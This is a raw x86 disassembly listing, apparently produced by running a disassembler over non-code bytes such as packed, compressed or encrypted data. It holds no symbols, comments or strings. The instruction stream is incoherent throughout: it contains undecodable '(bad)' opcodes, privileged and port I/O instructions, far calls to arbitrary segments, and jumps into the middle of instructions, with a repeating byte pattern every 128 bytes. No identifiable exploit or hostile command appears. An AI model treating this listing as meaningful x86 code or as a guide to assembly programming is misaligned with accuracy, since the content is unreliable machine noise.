  414917:	icebp  
  414918:	dec    esp
  414919:	sub    eax,0xea0b8c3e
  41491e:	aam    0x2e
  414920:	lock inc ebx
  414922:	sub    BYTE PTR [ecx],bl
  414924:	xchg   esp,eax
  414925:	fld    QWORD PTR [edx-0x7cb356bd]
  41492b:	mov    ds:0xe7156ca9,al
  414930:	cmp    esp,esp
  414932:	bound  esp,QWORD PTR [ebx+0x3a4ca4c1]
  414938:	xor    al,0xbd
  41493a:	mov    bl,0x24
  41493c:	jp     0x414987
  41493e:	rcl    DWORD PTR [edi+0x5f9236fa],1
  414944:	ss mov esi,edi
  414947:	add    eax,0x75207095
  41494c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41494d:	jne    0x41496d
  41494f:	les    esp,FWORD PTR ds:0x392697b1
  414955:	nop
  414956:	sbb    al,0x9a
  414958:	mov    cl,BYTE PTR [edx-0x7e]
  41495b:	jbe    0x41490b
  41495d:	adc    dl,dh
  41495f:	call   0x99a0:0x950d2c70
  414966:	inc    edi
  414967:	retf   
  414968:	and    DWORD PTR [esi-0x31],eax
  41496b:	jns    0x414967
	...
  4149d5:	add    BYTE PTR [ebx],cl
  4149d7:	jle    0x4149ab
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	neg    ebp
  4149e4:	ret    
  4149e5:	jns    0x414a47
  4149e7:	fiadd  WORD PTR [eax]
  4149e9:	add    bh,bh
  4149eb:	add    BYTE PTR [eax],al
  4149ed:	add    BYTE PTR [eax],dh
  4149ef:	ja     0x414a3a
  4149f1:	cmp    edx,DWORD PTR ds:0xb3f4429d
  4149f7:	and    ebp,ecx
  4149f9:	mov    eax,ds:0x375bd9c5
  4149fe:	out    0xf5,eax
  414a00:	xlat   BYTE PTR ds:[ebx]
  414a01:	and    al,0xfd
  414a03:	jge    0x414a31
  414a05:	icebp  
  414a06:	not    DWORD PTR [ecx-0x497138ba]
  414a0c:	rcl    BYTE PTR [eax+0x52],1
  414a0f:	icebp  
  414a10:	adc    al,0xf6
  414a12:	inc    edx
  414a13:	imul   esi,DWORD PTR [ecx-0x57]
  414a17:	push   edi
  414a18:	fld    QWORD PTR [eax-0x27646cf]
  414a1e:	ins    BYTE PTR es:[edi],dx
  414a1f:	mov    eax,DWORD PTR [ecx+0x747f7d89]
  414a25:	aam    0x21
  414a27:	lahf   
  414a28:	add    al,BYTE PTR [edi+ecx*2+0x4b]
  414a2c:	push   0x39
  414a2e:	(bad)  
  414a2f:	sti    
  414a30:	repnz inc edi
  414a32:	adc    ebp,ebp
  414a34:	mov    edi,0x6970a01b
  414a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3b:	es pop ebx
  414a3d:	push   edi
  414a3e:	adc    al,0xb3
  414a40:	mov    cl,0x85
  414a42:	scas   al,BYTE PTR es:[edi]
  414a43:	jmp    0xb7232b78
  414a48:	inc    esi
  414a49:	out    dx,al
  414a4a:	test   BYTE PTR [ebx],0xb
  414a4d:	sbb    al,0xb0
  414a4f:	leave  
  414a50:	dec    esp
  414a51:	aad    0x51
  414a53:	icebp  
  414a54:	fnstsw WORD PTR [eax-0x264a10bc]
  414a5a:	jmp    0x414a2f
  414a5c:	repz jp 0x414a6d
  414a5f:	shl    BYTE PTR [esp+ebx*1],0x20
  414a63:	enter  0x8c2,0xa7
  414a67:	retf   
  414a68:	cmp    eax,DWORD PTR [esi-0x3d]
  414a6b:	mov    esp,0x2946cb45
  414a70:	(bad)  
  414a72:	jo     0x414acc
  414a74:	das    
  414a75:	pusha  
  414a76:	xchg   ecx,eax
  414a77:	xchg   edx,eax
  414a78:	pop    ebp
  414a79:	xchg   edi,eax
  414a7a:	jp     0x414acf
  414a7c:	out    0xf,eax
  414a7e:	mov    bl,0x43
  414a80:	mov    esi,0x97f08a66
  414a85:	pop    ds
  414a86:	mov    ch,0xd5
  414a88:	(bad)  
  414a89:	loope  0x414a3c
  414a8b:	cmp    DWORD PTR [edi-0x3efcc015],esp
  414a91:	fwait
  414a92:	mov    WORD PTR [esi],?
  414a94:	inc    esp
  414a95:	dec    eax
  414a96:	sbb    al,0xe4
  414a98:	shl    DWORD PTR [edi+0x2cf09042],0xf7
  414a9f:	mov    eax,0xb296d5b9
  414aa4:	xlat   BYTE PTR ds:[ebx]
  414aa5:	neg    BYTE PTR [esi]
  414aa7:	cmp    edx,DWORD PTR [esi]
  414aa9:	dec    ebp
  414aaa:	pop    ecx
  414aab:	push   cs
  414aac:	mov    al,0xb1
  414aae:	cwde   
  414aaf:	mov    dl,0x5f
  414ab1:	ss or  al,0x89
  414ab4:	jno    0x414a75
  414ab6:	mov    edx,0xe7688206
  414abb:	ins    BYTE PTR es:[edi],dx
  414abc:	sti    
  414abd:	outs   dx,BYTE PTR ds:[esi]
  414abe:	dec    edx
  414abf:	inc    ebp
  414ac0:	mov    ch,0xa1
  414ac2:	mov    DWORD PTR [esp+ecx*8-0x4c],0xbf9b931e
  414aca:	pop    esp
  414acb:	push   esp
  414acc:	jp     0x414a60
  414ace:	popf   
  414acf:	into   
  414ad0:	rcr    esp,0xa5
  414ad3:	out    0x2f,al
  414ad5:	jg     0x414b0a
  414ad7:	adc    DWORD PTR [ebx+0x2ac473af],esi
  414add:	das    
  414ade:	call   0xcbaf:0x841495d2
  414ae5:	xchg   esp,eax
  414ae6:	push   ebx
  414ae7:	in     eax,0x50
  414ae9:	rol    BYTE PTR [ebx+0xe6b3],cl
	...
  414b53:	add    BYTE PTR [eax],al
  414b55:	add    BYTE PTR [edi+0x7e363ed9],bl
  414b5b:	neg    DWORD PTR [edi-0x265c9d07]
  414b61:	arpl   WORD PTR [ebx+0x5f3984d2],ax
  414b67:	fild   WORD PTR [eax]
  414b69:	add    bh,bh
  414b6b:	add    BYTE PTR [eax],al
  414b6d:	add    BYTE PTR [edi-0x41],bl
  414b70:	js     0x414bdb
  414b72:	fbld   TBYTE PTR cs:[ecx-0x18fd94f2]
  414b79:	cld    
  414b7a:	pop    esp
  414b7b:	loopne 0x414b3d
  414b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b7e:	add    al,0x42
  414b80:	pushw  ds
  414b82:	arpl   WORD PTR [eax],si
  414b84:	jns    0x414b32
  414b86:	cli    
  414b87:	or     BYTE PTR [esi+0x308d7d11],ah
  414b8d:	retf   
  414b8e:	sub    dl,BYTE PTR [eax+esi*1-0x4b]
  414b92:	sahf   
  414b93:	adc    eax,0xc8d5e766
  414b98:	scas   al,BYTE PTR es:[edi]
  414b99:	(bad)  
  414b9a:	pop    esp
  414b9b:	or     eax,0xde3f6560
  414ba0:	sub    ecx,DWORD PTR [ebp-0x570806f4]
  414ba6:	jae    0x414c12
  414ba8:	inc    ebx
  414ba9:	pop    ss
  414baa:	mov    dl,0x49
  414bac:	out    0x9,eax
  414bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414baf:	push   edx
  414bb0:	cwde   
  414bb1:	add    DWORD PTR [ebp+0x60],esi
  414bb4:	pop    es
  414bb5:	mov    dh,0x53
  414bb7:	sbb    esi,DWORD PTR [eax+0x38]
  414bba:	outs   dx,BYTE PTR ds:[esi]
  414bbb:	dec    eax
  414bbc:	xchg   edx,eax
  414bbd:	sti    
  414bbe:	cmp    eax,0xb9e1a244
  414bc3:	mov    dh,0x78
  414bc5:	dec    edi
  414bc6:	jecxz  0x414bd2
  414bc8:	or     eax,0x654af466
  414bcd:	es aas 
  414bcf:	pop    edx
  414bd0:	ror    edi,0x75
  414bd3:	dec    edi
  414bd4:	fwait
  414bd5:	out    0x5b,al
  414bd7:	fild   WORD PTR [ebp+0x55d5e512]
  414bdd:	inc    edi
  414bde:	jae    0x414bf8
  414be0:	push   0x446138c7
  414be5:	cs pop ebp
  414be7:	mov    bl,0xe7
  414be9:	inc    ebx
  414bea:	shl    DWORD PTR [edi-0x68],0x4c
  414bee:	into   
  414bef:	icebp  
  414bf0:	out    0x6b,al
  414bf2:	iret   
  414bf3:	ds mov dh,0x7e
  414bf6:	jecxz  0x414bad
  414bf8:	ins    BYTE PTR es:[edi],dx
  414bf9:	arpl   WORD PTR ds:0x9f2aa957,di
  414bff:	pusha  
  414c00:	loopne 0x414be5
  414c02:	mov    ch,0x20
  414c04:	jge    0x414c2e
  414c06:	mov    ebx,0xa1008928
  414c0b:	mov    ebx,0x4d7cedcf
  414c10:	push   ebp
  414c11:	xchg   edi,eax
  414c12:	dec    ebp
  414c13:	cmp    edi,DWORD PTR [esi+0x3b3d8450]
  414c19:	mov    ?,WORD PTR [edx+0x303c9739]
  414c1f:	mov    al,ds:0xd2b44521
  414c24:	outs   dx,DWORD PTR ds:[esi]
  414c25:	mov    dl,0x11
  414c27:	jns    0x414c59
  414c29:	and    DWORD PTR [ebp*2+0x714769aa],ebp
  414c30:	sub    eax,0xe103e54c
  414c35:	enter  0xbaa6,0x24
  414c39:	call   0x6740:0xb56b6866
  414c40:	loopne 0x414cc1
  414c42:	jmp    0xbc0ac8b4
  414c47:	int3   
  414c48:	clc    
  414c49:	iret   
  414c4a:	icebp  
  414c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c4c:	loope  0x414cc0
  414c4e:	mov    ecx,0xb5858a42
  414c53:	mov    bl,0xdc
  414c55:	cmp    BYTE PTR [ebx+eiz*2+0x227e76a8],0x6b
  414c5d:	das    
  414c5e:	(bad)  
  414c60:	mov    ss,ebx
  414c62:	pop    ebx
  414c63:	bound  esi,QWORD PTR [ecx-0x6d]
  414c66:	jno    0x414c3f
  414c68:	inc    ebp
  414c69:	pop    DWORD PTR [edi+0x20]
  414c6c:	cmp    eax,DWORD PTR [eax]
	...
  414cd6:	xor    al,0x64
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	cs adc edi,eax
  414ce3:	xor    edi,DWORD PTR [esi+0x22]
  414ce6:	pop    esi
  414ce7:	loopne 0x414ce9
  414ce9:	add    bh,bh
  414ceb:	add    BYTE PTR [eax],al
  414ced:	add    BYTE PTR [edi+0x54805b50],cl
  414cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cf4:	cdq    
  414cf5:	xchg   esp,eax
  414cf6:	stc    
  414cf7:	sub    dl,bh
  414cf9:	dec    esi
  414cfa:	push   eax
  414cfb:	jp     0x414cb8
  414cfd:	sbb    ebx,ecx
  414cff:	test   DWORD PTR [edx+0x1629205a],0xef7fb603
  414d09:	inc    esp
  414d0a:	arpl   WORD PTR [edx+eax*4+0xf],bp
  414d0e:	fild   QWORD PTR ds:0xb496afee
  414d14:	addr16 call 0xcc0c5657
  414d1a:	xchg   ecx,eax
  414d1b:	fld    TBYTE PTR [edx+ecx*4+0x7ba888c2]
  414d22:	cdq    
  414d23:	cld    
  414d24:	imul   ecx,DWORD PTR [ebp+0x36],0x5e02717a
  414d2b:	cmp    ah,BYTE PTR [ecx-0x3f]
  414d2e:	jae    0x414d35
  414d30:	mov    ebx,0x705c52ae
  414d35:	mov    ah,0x20
  414d37:	dec    edi
  414d39:	es fs push ds
  414d3c:	cli    
  414d3d:	dec    ecx
  414d3e:	fidiv  WORD PTR [esp+eax*4-0x14]
  414d42:	xchg   edx,eax
  414d43:	sub    DWORD PTR [edi+edi*8],ebp
  414d46:	retf   0x543d
  414d49:	jne    0x414d5d
  414d4b:	out    dx,eax
  414d4c:	outs   dx,DWORD PTR ds:[esi]
  414d4d:	push   0x33f7aacf
  414d52:	stos   DWORD PTR es:[edi],eax
  414d53:	call   0x339f:0x871294ca
  414d5a:	loopne 0x414d1d
  414d5c:	push   ebp
  414d5d:	jg     0x414d32
  414d5f:	cwde   
  414d60:	(bad)  
  414d61:	shl    BYTE PTR [eax+0x538e53b9],0x8d
  414d68:	retf   0xd94a
  414d6b:	dec    esp
  414d6c:	inc    esi
  414d6d:	stc    
  414d6e:	imul   edi,esi,0xd6111fd
  414d74:	jmp    0xa102e01b
  414d79:	dec    ebp
  414d7a:	ret    
  414d7b:	mov    ds:0xfe3ff5f9,al
  414d80:	cld    
  414d81:	stc    
  414d82:	push   0xb71fca7b
  414d87:	scas   al,BYTE PTR es:[edi]
  414d88:	out    0xfc,al
  414d8a:	sub    esp,DWORD PTR [edx+0x79]
  414d8d:	fist   DWORD PTR [ebx+0x645186fd]
  414d93:	cmp    ch,0x9e
  414d96:	jecxz  0x414db3
  414d98:	mov    al,ds:0x7f7fe626
  414d9d:	pusha  
  414d9e:	ror    BYTE PTR [esi-0x3b],1
  414da1:	es jg  0x414dcb
  414da4:	(bad)  
  414da6:	js     0x414dc2
  414da8:	stos   BYTE PTR es:[edi],al
  414da9:	mov    eax,ds:0x5dd1ca3b
  414dae:	stc    
  414daf:	clc    
  414db0:	nop
  414db1:	out    0xed,eax
  414db3:	enter  0x67d4,0x67
  414db7:	not    BYTE PTR [esi+0x1d0be8be]
  414dbd:	mov    BYTE PTR [edi-0x43],bh
  414dc0:	cmc    
  414dc1:	daa    
  414dc2:	push   edi
  414dc3:	sbb    BYTE PTR [esi],bl
  414dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dc6:	adc    eax,0x8a747925
  414dcb:	std    
  414dcc:	nop
  414dcd:	jne    0x414d7b
  414dcf:	or     DWORD PTR [edi-0x54442bcd],0xffaf02af
  414dd9:	adc    BYTE PTR [esi],ah
  414ddb:	loopne 0x414e2b
  414ddd:	mov    eax,ds:0x4d41e0a6
  414de2:	xchg   cl,dh
  414de4:	pop    ds
  414de5:	stos   DWORD PTR es:[edi],eax
  414de6:	repz mov edx,0xe1d39497
  414dec:	xlat   BYTE PTR ds:[ebx]
	...
  414e55:	add    BYTE PTR [edi+0x3e911299],dh
  414e5b:	fwait
  414e5c:	mov    bh,0xbf
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x3f01c3c0
  414e66:	pop    ebp
  414e67:	loope  0x414e69
  414e69:	add    bh,bh
  414e6b:	add    BYTE PTR [eax],al
  414e6d:	add    BYTE PTR [ebx],bh
  414e6f:	jns    0x414e2e
  414e71:	adc    DWORD PTR [eax],ebx
  414e73:	ror    DWORD PTR [ecx-0x77],cl
  414e76:	jo     0x414e60
  414e78:	push   edi
  414e79:	mov    esi,0x7a6c047d
  414e7e:	mov    ah,0x41
  414e80:	dec    ebx
  414e81:	mov    dl,0xaa
  414e83:	sbb    al,0xb0
  414e85:	not    BYTE PTR [esi]
  414e87:	mov    ecx,0x86da19f
  414e8c:	mov    ds:0x9a88fbf5,al
  414e91:	add    DWORD PTR [ebx],ebx
  414e93:	jp     0x414e69
  414e95:	sbb    eax,DWORD PTR [esi]
  414e97:	in     eax,dx
  414e98:	leave  
  414e99:	(bad)  
  414e9b:	dec    edx
  414e9c:	mov    ecx,0xd371e469
  414ea1:	cmovb  edi,DWORD PTR [ebx+0x12809836]
  414ea8:	fbstp  TBYTE PTR [esi-0x38156a46]
  414eae:	stos   BYTE PTR es:[edi],al
  414eaf:	mov    ebp,0x1f896ecd
  414eb4:	cmp    ah,BYTE PTR [ebp-0x801e2d2]
  414eba:	ja     0x414f38
  414ebc:	pop    ebp
  414ebd:	imul   eax,DWORD PTR ds:0x31cd188b,0x76ca171a
  414ec7:	jg     0x414e75
  414ec9:	jae    0x414f0f
  414ecb:	or     esp,edi
  414ecd:	sti    
  414ece:	(bad)  [edx-0x17]
  414ed1:	call   0x6a6c:0xbfa05727
  414ed8:	xor    eax,0xa4632d41
  414edd:	add    DWORD PTR [edi+0xf],eax
  414ee0:	jecxz  0x414f1a
  414ee2:	sbb    ebx,0x3bcdf184
  414ee8:	cs sub edx,ebx
  414eeb:	and    edi,DWORD PTR [edi]
  414eed:	lahf   
  414eee:	into   
  414eef:	mov    esp,0xbebb2885
  414ef4:	repz add al,0xbd
  414ef7:	cmp    bh,BYTE PTR [ecx-0x7b]
  414efa:	int    0x26
  414efc:	ror    bh,0x2e
  414eff:	imul   DWORD PTR [ebp+ecx*2-0x39]
  414f03:	ins    DWORD PTR es:[edi],dx
  414f04:	cmp    edx,ebp
  414f06:	sub    edi,esi
  414f08:	mov    esi,0xd3512d28
  414f0d:	lahf   
  414f0e:	add    ebx,DWORD PTR [esi-0x190a8979]
  414f14:	mov    ecx,0x8614a4dd
  414f19:	dec    ebp
  414f1a:	mov    ds,WORD PTR [ebx-0x2ecb9ed0]
  414f20:	pop    es
  414f21:	sub    ecx,esp
  414f23:	push   edi
  414f24:	mov    bl,0x8
  414f26:	nop
  414f27:	mov    esi,0x3a872c7d
  414f2c:	add    esp,DWORD PTR [edx]
  414f2e:	(bad)  
  414f2f:	test   DWORD PTR [edx-0x6b],0x8d39e66c
  414f36:	repz mov al,ds:0xc7979b0f
  414f3c:	cmp    BYTE PTR [eax+edi*2+0x7af0739f],0x40
  414f44:	xchg   ebp,eax
  414f45:	pop    edx
  414f46:	or     DWORD PTR [ebp+0x26],eax
  414f49:	xchg   BYTE PTR [ebp-0x70],ah
  414f4c:	and    BYTE PTR [esi],dl
  414f4e:	jo     0x414f78
  414f50:	int    0xef
  414f52:	scas   eax,DWORD PTR es:[edi]
  414f53:	pop    esi
  414f54:	or     esp,eax
  414f56:	ret    0x12e5
  414f59:	jp     0x414ef3
  414f5b:	pop    eax
  414f5c:	xchg   ebx,eax
  414f5d:	xchg   esp,eax
  414f5e:	outs   dx,BYTE PTR ds:[esi]
  414f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f60:	xchg   ecx,eax
  414f61:	jl     0x414f64
  414f63:	push   es
  414f64:	xchg   DWORD PTR [esi+esi*4+0x3ca094cd],edi
  414f6b:	xor    al,0x83
	...
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe25c:0xb592a31c
  414fe8:	add    BYTE PTR [eax],al
  414fea:	inc    DWORD PTR [eax]
  414fec:	add    BYTE PTR [eax],al
  414fee:	sahf   
  414fef:	sti    
  414ff0:	mov    bl,0x7f
  414ff2:	rol    BYTE PTR [ebx+edi*4],cl
  414ff5:	(bad)  
  414ff6:	into   
  414ff7:	pop    ds
  414ff8:	and    bh,BYTE PTR [esi+0x26]
  414ffb:	mov    eax,ds:0x41ed0b41
  415000:	jecxz  0x414f9c
  415002:	call   0x3e6c:0x5d4f0eb4
  415009:	loop   0x414ff4
  41500b:	(bad)  
  41500c:	xchg   BYTE PTR [ecx-0x3f78a844],ch
  415012:	pop    esp
  415013:	xor    DWORD PTR [ecx-0x51d052f6],0x76
  41501a:	sub    BYTE PTR [edx],dh
  41501c:	outs   dx,BYTE PTR ds:[esi]
  41501d:	(bad)
  415020:	mov    dh,0xc2
  415022:	pusha  
  415023:	jg     0x415039
  415025:	or     ecx,DWORD PTR [edx]
  415027:	inc    ebp
  415028:	mov    bh,0x29
  41502a:	imul   esp,DWORD PTR [edx+0x46cbdb97],0x1e01a0fb
  415034:	lods   al,BYTE PTR ds:[esi]
  415035:	push   cs
  415036:	lods   eax,DWORD PTR ds:[esi]
  415037:	mov    esp,DWORD PTR [ebx+eiz*2+0x477e843d]
  41503e:	(bad)  
  41503f:	shl    DWORD PTR [ecx+eiz*4-0x4670b37d],cl
  415046:	sti    
  415047:	or     BYTE PTR [edi+0x2d],dh
  41504a:	jecxz  0x415002
  41504c:	jle    0x414feb
  41504e:	(bad)  
  41504f:	pop    ebp
  415050:	das    
  415051:	xchg   esp,eax
  415052:	jl     0x4150cc
  415054:	pop    esp
  415055:	mov    al,ds:0xbdeee32d
  41505a:	xor    DWORD PTR [ecx],esi
  41505c:	shr    ebp,0xea
  41505f:	dec    eax
  415060:	jge    0x415091
  415062:	cmp    dl,BYTE PTR [edi]
  415064:	rol    BYTE PTR fs:[ebx-0x1a0d2fc7],cl
  41506b:	mov    cl,bl
  41506d:	dec    BYTE PTR [edi+0x4f]
  415070:	cmp    BYTE PTR [ecx+0x9d864a8],cl
  415076:	mov    ds:0x6dd3d6b0,al
  41507b:	jl     0x415002
  41507d:	in     al,dx
  41507e:	inc    eax
  41507f:	pop    ebp
  415080:	out    0xd6,al
  415082:	pop    esp
  415083:	inc    ecx
  415084:	xchg   DWORD PTR [ecx+0x57],esi
  415087:	adc    ebx,ebx
  415089:	jmp    0x415097
  41508b:	sbb    ebp,DWORD PTR ds:0xe3714222
  415091:	(bad)  
  415092:	cmp    BYTE PTR [edi],al
  415094:	mov    ch,0xb1
  415096:	lahf   
  415097:	mov    ah,0x31
  415099:	jle    0x41501e
  41509b:	(bad)  
  41509c:	(bad)  
  41509d:	pushf  
  41509e:	bound  ebx,QWORD PTR [esi-0x31116268]
  4150a4:	fst    DWORD PTR [esi+ebp*1+0x5b]
  4150a8:	dec    esp
  4150a9:	mov    DWORD PTR [edi-0x6b],0xa9a71a40
  4150b0:	dec    esi
  4150b1:	clc    
  4150b2:	lock fsub st(1),st
  4150b5:	popa   
  4150b6:	jp     0x41510b
  4150b8:	fs jo  0x4150d2
  4150bb:	xor    al,0xae
  4150bd:	bound  ebp,QWORD PTR [esi-0x47]
  4150c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150c1:	fst    DWORD PTR [esi]
  4150c3:	clc    
  4150c4:	(bad)  
  4150c5:	(bad)  
  4150c7:	icebp  
  4150c8:	aam    0x28
  4150ca:	test   DWORD PTR [eax-0x9],edx
  4150cd:	and    eax,DWORD PTR [ecx-0xcb1bc6c]
  4150d3:	fdivr  DWORD PTR [edx+esi*2+0x6]
  4150d7:	sub    al,0x56
  4150d9:	and    eax,ebx
  4150db:	push   edx
  4150dc:	imul   ecx,eax,0x8979fe71
  4150e2:	shl    BYTE PTR [ecx],cl
  4150e4:	jp     0x415114
  4150e6:	mov    dl,dl
  4150e8:	sub    esi,edi
  4150ea:	mov    dh,0xab
  4150ec:	hlt    
	...
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0xd575fc2d
  415164:	cdq    
  415165:	mov    dh,0x5b
  415167:	jecxz  0x415169
  415169:	add    bh,bh
  41516b:	add    BYTE PTR [eax],al
  41516d:	add    BYTE PTR [ecx],ah
  41516f:	sahf   
  415170:	lods   eax,DWORD PTR ds:[esi]
  415171:	outs   dx,DWORD PTR ds:[esi]
  415172:	or     bh,BYTE PTR [ecx]
  415174:	in     eax,dx
  415175:	dec    ebp
  415176:	adc    cl,BYTE PTR [ecx-0x43a13388]
  41517c:	jne    0x415167
  41517e:	imul   eax,DWORD PTR [ebp-0x17],0x62
  415182:	outs   dx,DWORD PTR ds:[esi]
  415183:	fldcw  WORD PTR [edi+esi*2-0x54a40f74]
  41518a:	inc    eax
  41518b:	jnp    0x415174
  41518d:	xchg   esi,eax
  41518e:	stos   DWORD PTR es:[edi],eax
  41518f:	or     eax,0x6f050460
  415194:	adc    dl,BYTE PTR [eax-0x4a]
  415197:	lods   al,BYTE PTR ds:[esi]
  415198:	dec    ebx
  415199:	imul   esi,edi,0xd0202e7d
  41519f:	pop    edx
  4151a0:	mov    ds:0x62fec8eb,eax
  4151a5:	jo     0x415166
  4151a7:	sbb    BYTE PTR [esi+0xa],dh
  4151aa:	(bad)
  4151ae:	sub    edi,DWORD PTR [ebx+0x1c]
  4151b1:	pop    esi
  4151b2:	(bad)  
  4151b3:	retf   0x26d0
  4151b6:	inc    ebx
  4151b7:	sbb    DWORD PTR [ebx],esp
  4151b9:	sub    al,0xd5
  4151bb:	int3   
  4151bc:	pushf  
  4151bd:	fld    DWORD PTR [ecx]
  4151bf:	addr16 or eax,0xd90bd2b1
  4151c5:	or     bl,BYTE PTR [ebp-0x7a]
  4151c8:	mov    ebx,0x275484e5
  4151cd:	sbb    al,0xaf
  4151cf:	sub    al,BYTE PTR [esi-0x33]
  4151d2:	inc    edx
  4151d3:	mov    eax,ds:0x2d64bec1
  4151d8:	push   0x28
  4151da:	push   esp
  4151db:	xor    al,0x4e
  4151dd:	pop    ebx
  4151de:	cmp    eax,edi
  4151e0:	out    0xfd,al
  4151e2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4151e4:	cmp    eax,0x493f2877
  4151e9:	jo     0x415261
  4151eb:	imul   ecx,DWORD PTR [ebx-0x3d],0xffffffe5
  4151ef:	adc    ch,dh
  4151f1:	test   BYTE PTR ds:[ecx],cl
  4151f4:	cmp    BYTE PTR [edx+0x43],bh
  4151f7:	jecxz  0x415241
  4151f9:	cmp    DWORD PTR [edx+0x6569286f],edi
  4151ff:	dec    ebp
  415200:	sar    DWORD PTR [ebx],0xf2
  415203:	loope  0x415234
  415205:	out    0xf,al
  415207:	adc    ebp,DWORD PTR ds:0x668e194c
  41520d:	mov    es:0x66f6be19,al
  415213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415214:	stc    
  415215:	test   DWORD PTR [ecx],esp
  415217:	xchg   edx,eax
  415218:	mov    eax,esi
  41521a:	sub    ebp,DWORD PTR [edi]
  41521c:	lods   eax,DWORD PTR ds:[esi]
  41521d:	stos   BYTE PTR es:[edi],al
  41521e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41521f:	adc    eax,0xcaa5a889
  415224:	jge    0x415270
  415226:	inc    esp
  415227:	(bad)  
  415228:	int3   
  415229:	nop
  41522a:	stos   DWORD PTR es:[edi],eax
  41522b:	mov    bh,0xb0
  41522d:	or     ch,BYTE PTR [edx-0x22]
  415230:	jns    0x41528c
  415232:	jnp    0x4152b1
  415234:	sbb    edx,DWORD PTR [eax]
  415236:	xchg   edx,eax
  415237:	ret    
  415238:	stc    
  415239:	xchg   edi,eax
  41523a:	in     al,0x9c
  41523c:	repz mov al,0xd2
  41523f:	adc    eax,0x4898e1ac
  415244:	push   0xf
  415246:	xchg   DWORD PTR [esi-0x42],edx
  415249:	mov    ch,0x57
  41524b:	aaa    
  41524c:	sahf   
  41524d:	enter  0xc8a1,0xc
  415251:	add    esi,DWORD PTR [ebp+0x10fc089d]
  415257:	push   ebp
  415258:	mov    edx,0x7c4db153
  41525d:	stc    
  41525e:	mov    bh,0xd1
  415260:	adc    DWORD PTR [edi-0x29c17f3c],ebp
  415266:	fwait
  415267:	hlt    
  415268:	xchg   edx,eax
  415269:	in     ax,0x49
  41526c:	test   al,0x0
	...
  4152d6:	sub    al,0x97
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x1d63fa0b
  4152e5:	pop    es
  4152e6:	pop    edx
  4152e7:	in     al,0x0
  4152e9:	add    bh,bh
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	add    BYTE PTR [esi-0x3f],ch
  4152f0:	xchg   edi,eax
  4152f1:	fwait
  4152f2:	xchg   BYTE PTR [edx],cl
  4152f4:	add    al,0xcd
  4152f6:	jle    0x41530d
  4152f8:	gs (bad) 
  4152fa:	mov    al,0xa1
  4152fc:	cmp    BYTE PTR ds:0xfea54aa6,dh
  415302:	es stos DWORD PTR es:[edi],eax
  415304:	xchg   BYTE PTR [eax+esi*4],ah
  415307:	mov    esp,0xafca758c
  41530c:	repz xor DWORD PTR [ebx+0x2e],0x76
  415311:	inc    edx
  415312:	or     eax,0xfca1d3b3
  415317:	sbb    eax,0x42cab25a
  41531c:	clc    
  41531d:	jmp    FWORD PTR [ebp-0x7b]
  415320:	dec    ecx
  415321:	inc    eax
  415322:	lea    ecx,[edi+0x621af2b1]
  415328:	jmp    0xdb85482c
  41532d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41532e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41532f:	test   DWORD PTR [ecx-0x10],esi
  415332:	pop    ebx
  415333:	test   DWORD PTR ds:0x3a8de8a2,0x1b7de6e0
  41533d:	mov    edi,0x39333ccf
  415342:	dec    ebp
  415343:	(bad)  
  415344:	push   esp
  415345:	sbb    al,0x27
  415347:	jge    0x4153a4
  415349:	or     ebx,edx
  41534b:	inc    eax
  41534c:	fs stc 
  41534e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41534f:	xor    DWORD PTR [esi-0x52],0xffffffe0
  415353:	pop    esp
  415354:	fs mov ebp,ebp
  415357:	cmp    eax,0xe8ad3799
  41535c:	retf   0x721e
  41535f:	mov    ebp,0xc8957275
  415364:	push   esp
  415365:	mov    es,esi
  415367:	lahf   
  415368:	shl    BYTE PTR cs:[eax-0x60cd3e6f],cl
  41536f:	outs   dx,DWORD PTR ds:[esi]
  415370:	or     al,ah
  415372:	xlat   BYTE PTR ds:[ebx]
  415373:	rcl    BYTE PTR [edx],0x5f
  415376:	adc    ecx,DWORD PTR [esi-0x6a]
  415379:	and    ch,ch
  41537b:	(bad)  
  41537c:	cmp    DWORD PTR [esi-0x90fc41e],edx
  415382:	mov    ds:0x1be305ca,al
  415387:	into   
  415388:	fmul   QWORD PTR [esi-0x5c]
  41538b:	ins    DWORD PTR es:[edi],dx
  41538c:	sbb    dh,BYTE PTR [ecx]
  41538e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41538f:	pop    ebx
  415390:	out    dx,eax
  415391:	dec    edi
  415392:	sub    cl,BYTE PTR [ecx+0x5525c881]
  415398:	jmp    0x4153f0
  41539a:	dec    edx
